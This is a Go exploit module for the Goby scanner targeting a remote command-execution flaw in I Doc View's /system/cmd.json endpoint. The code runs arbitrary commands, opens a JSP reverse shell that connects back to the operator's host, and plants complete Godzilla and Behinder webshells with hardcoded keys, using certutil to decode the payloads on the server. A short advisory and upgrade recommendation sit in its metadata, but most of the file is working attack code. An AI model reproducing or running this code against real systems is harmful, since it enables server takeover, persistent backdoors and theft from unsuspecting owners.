package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"html"
	"net"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "I Doc View cmd.json remote command execution vulnerability",
    "Description": "<p>I Doc View online document preview is an online document preview system.</p><p>I Doc View versions less than 13.10.1_20231115 have a command execution vulnerability at system/cmd. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "I-Doc-View",
    "Homepage": "https://www.idocv.com/",
    "DisclosureDate": "2023-11-22",
    "PostTime": "2023-11-23",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"I Doc View\"",
    "GobyQuery": "body=\"I Doc View\"",
    "Level": "3",
    "Impact": "<p>I Doc View has a command execution vulnerability at system/cmd. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Please upgrade I DOC View to version 13.10.1_20231115 or above or contact the official to get the fix plan: <a href=\"https://api.idocv.com.\">https://api.idocv.com.</a></p><p>temporary plan:</p><p>1. Intercept request access to the affected API interface.</p><p>2. Restrict access and allow only trusted users to access.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.jsp",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "I Doc View cmd.json 远程命令执行漏洞",
            "Product": "I-Doc-View",
            "Description": "<p>I Doc View在线文档预览是一款在线文档预览系统。</p><p>I Doc View 版本小于 &lt; 13.10.1_20231115 的在 system/cmd 处存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>官方已修复漏洞，请升级 I DOC View 至 13.10.1_20231115 以上版本或联系官方获取修复方案：<a href=\"https://api.idocv.com\">https://api.idocv.com</a>。</p><p>临时方案：</p><p>1. 拦截受影响 API 接口的请求访问。</p><p>2. 进行访问限制，只允许受信用户进行访问。</p>",
            "Impact": "<p>I Doc View 在system/cmd 处存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "I Doc View cmd.json remote command execution vulnerability",
            "Product": "I-Doc-View",
            "Description": "<p>I Doc View online document preview is an online document preview system.</p><p>I Doc View versions less than 13.10.1_20231115 have a command execution vulnerability at system/cmd. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Please upgrade I DOC View to version 13.10.1_20231115 or above or contact the official to get the fix plan: <a href=\"https://api.idocv.com.\">https://api.idocv.com.</a><br></p><p>temporary plan:</p><p>1. Intercept request access to the affected API interface.</p><p>2. Restrict access and allow only trusted users to access.</p>",
            "Impact": "<p>I Doc View has a command execution vulnerability at system/cmd. An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10876"
}`
	base64EncodezrdyG37RcvFdY93 := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendPayloadzrdyG37RcvFdY93 := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/system/cmd.json")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "cmd=" + url.QueryEscape(payload)
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	executezrdyG37RcvFdY93 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		executeConfig := httpclient.NewGetRequestConfig(uri)
		executeConfig.VerifyTls = false
		executeConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, executeConfig)
	}
	fetchDriveG37RcvFdY93 := func(hostInfo *httpclient.FixUrl) (string, error) {
		resp, err := sendPayloadzrdyG37RcvFdY93(hostInfo, "echo dosiajdi & cd & echo dosiajdi")
		if err != nil {
			return "", err
		} else if resp != nil && resp.StatusCode == 200 {
			matches := regexp.MustCompile(`dosiajdi <br />(.*?)<br />dosiajdi`).FindStringSubmatch(html.UnescapeString(resp.Utf8Html))
			if len(matches) > 1 {
				return strings.ReplaceAll(matches[1], `\\`, "/"), nil
			} else {
				return "", err
			}
		}
		return "", errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(16)
			resp, err := sendPayloadzrdyG37RcvFdY93(hostInfo, "echo "+randStr)
			if err != nil {
				return false
			}
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			content := goutils.B2S(stepLogs.Params["content"])
			filename := goutils.RandomHexString(6) + ".jsp"
			// 检测盘符
			drive, err := fetchDriveG37RcvFdY93(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				// 用java 的 exec 直接执行命令，由于回显脏字符太多，所以用三条命令拼接在一起实现，前后两条用echo 拼接起来，这样获取回显的时候，正则匹配的结果不容易出错。ps：该系统搭建在windows上
				resp, err := sendPayloadzrdyG37RcvFdY93(expResult.HostInfo, "echo asfGJdAy5sg7FWva & ("+cmd+") & echo asfGJdAy5sg7FWva")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"code":"1"`) {
					match := regexp.MustCompile(`<br />asfGJdAy5sg7FWva <br />(.*?)<br />asfGJdAy5sg7FWva`).FindStringSubmatch(resp.Utf8Html)
					if len(match) > 1 {
						// match[1] 代表获取组中的内容，也就是(.*?)的内容
						newline := strings.Replace(match[1], "<br />", "\n", -1)
						expResult.Success = true
						expResult.Output = html.UnescapeString(newline)
						return expResult
					} else {
						expResult.Output = err.Error()
						return expResult
					}
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				// 用 jsp 反弹 shell 的代码反弹。
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Output = err.Error()
					}
					addr = ips[0].String()
				}
				reverseCode := `<%@page import="java.lang.*,java.util.*,java.io.*,java.net.*"%><%class StreamConnector extends Thread{InputStream is;OutputStream os;StreamConnector(InputStream is,OutputStream os){this.is=is;this.os=os;}public void run(){BufferedReader in=null;BufferedWriter out=null;try{in=new BufferedReader(new InputStreamReader(this.is));out=new BufferedWriter(new OutputStreamWriter(this.os));char buffer[]=new char[8192];int length;while((length=in.read(buffer,0,buffer.length))>0){out.write(buffer,0,length);out.flush();}}catch(Exception e){}try{if(in!=null)in.close();if(out!=null)out.close();}catch(Exception e){}}}try{Socket socket=new Socket("` + addr + `",` + rp + `);Process process=Runtime.getRuntime().exec("cmd.exe");(new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();(new StreamConnector(socket.getInputStream(),process.getOutputStream())).start();}catch(Exception e){}%>`
				reverse, err := sendPayloadzrdyG37RcvFdY93(expResult.HostInfo, "echo "+base64EncodezrdyG37RcvFdY93(reverseCode)+" > "+drive+"/docview/hdZQ7x.txt")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if reverse != nil && reverse.StatusCode == 200 {
					reverseDecode, err := sendPayloadzrdyG37RcvFdY93(expResult.HostInfo, "certutil -f -decode \""+drive+"/docview/hdZQ7x.txt\" \""+drive+"/docview/hdZQ7x.jsp\"")
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if reverseDecode != nil && reverseDecode.StatusCode == 200 {
						execReverse, err := executezrdyG37RcvFdY93(expResult.HostInfo, "/hdZQ7x.jsp")
						if err != nil {
							expResult.Output = err.Error()
							return expResult
						} else if execReverse != nil && execReverse.StatusCode == 200 {
							select {
							case webConsoleID := <-waitSessionCh:
								if u, err := url.Parse(webConsoleID); err == nil {
									expResult.Success = true
									expResult.OutputType = "html"
									sid := strings.Join(u.Query()["id"], "")
									expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								}
							case <-time.After(time.Second * 20):
								expResult.Success = false
								expResult.Output = "漏洞利用失败"
							}
						}
					}
				}
			} else if attackType == "webshell" {
				tool := ""
				password := ""
				if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：JAVA_AES_BASE64"
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					// 改过的 behinder 马
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.nio.charset.StandardCharsets"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte[] b){return super.defineClass(null,b,0,b.length);}}%><%if(request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(k.getBytes(StandardCharsets.UTF_8),"AES"));byte[] decodedBytes=Base64.getDecoder().decode(request.getReader().readLine());new U(this.getClass().getClassLoader()).g(c.doFinal(decodedBytes)).newInstance().equals(pageContext);} %>`
				} else if webshell == "custom" {
					filename = goutils.B2S(stepLogs.Params["filename"])
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}

				webshellResp, err := sendPayloadzrdyG37RcvFdY93(expResult.HostInfo, "echo "+base64EncodezrdyG37RcvFdY93(content)+" > "+drive+"/docview/Fm5fPq.txt")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if webshellResp != nil && webshellResp.StatusCode == 200 {
					webshellDecode, err := sendPayloadzrdyG37RcvFdY93(expResult.HostInfo, "certutil -f -decode \""+drive+"/docview/Fm5fPq.txt\" \""+drive+"/docview/"+filename+"\"")
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if webshellDecode != nil && webshellDecode.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
						if webshell != "custom" {
							expResult.Output += "Password: " + password + "\n"
							expResult.Output += "WebShell tool: " + tool + "\n"
							expResult.Output += "Webshell type: jsp"
						}
					} else {
						expResult.Success = false
						expResult.Output = `漏洞利用失败`
						return expResult
					}
				}
			}
			return expResult
		},
	))
}
